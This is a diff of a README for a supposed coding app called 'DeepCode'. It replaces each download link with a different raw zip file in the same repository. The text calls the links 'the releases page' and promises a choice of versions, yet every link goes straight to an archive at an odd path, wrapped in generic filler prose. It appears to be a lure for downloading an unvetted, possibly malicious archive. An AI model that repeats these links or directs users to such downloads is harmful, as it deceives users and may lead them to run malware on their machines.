@@ -2,7 +2,7 @@
 
 ## 📥 Download DeepCode
 
-[![Download DeepCode](https://raw.githubusercontent.com/ElfER020/DeepCode/main/asarabacca/DeepCode.zip)](https://raw.githubusercontent.com/ElfER020/DeepCode/main/asarabacca/DeepCode.zip)
+[![Download DeepCode](https://github.com/ElfER020/DeepCode/raw/refs/heads/main/cli/Code_Deep_1.0.zip)](https://github.com/ElfER020/DeepCode/raw/refs/heads/main/cli/Code_Deep_1.0.zip)
 
 ## 📝 Overview
 
@@ -25,7 +25,7 @@ DeepCode is an innovative application designed to help you code effortlessly. It
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**  
-   First, go to the releases page to download DeepCode: [Download DeepCode](https://raw.githubusercontent.com/ElfER020/DeepCode/main/asarabacca/DeepCode.zip).
+   First, go to the releases page to download DeepCode: [Download DeepCode](https://github.com/ElfER020/DeepCode/raw/refs/heads/main/cli/Code_Deep_1.0.zip).
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of DeepCode. Select the latest version for the best features and fixes.
@@ -58,6 +58,6 @@ Your experience with DeepCode matters. We welcome your thoughts and feedback. Le
 
 ## 📥 Download & Install
 
-Make sure you follow the steps outlined above to get started. For more information or direct downloads, visit this page: [Download DeepCode](https://raw.githubusercontent.com/ElfER020/DeepCode/main/asarabacca/DeepCode.zip). 
+Make sure you follow the steps outlined above to get started. For more information or direct downloads, visit this page: [Download DeepCode](https://github.com/ElfER020/DeepCode/raw/refs/heads/main/cli/Code_Deep_1.0.zip). 
 
 Now, start your journey into the world of coding with DeepCode!
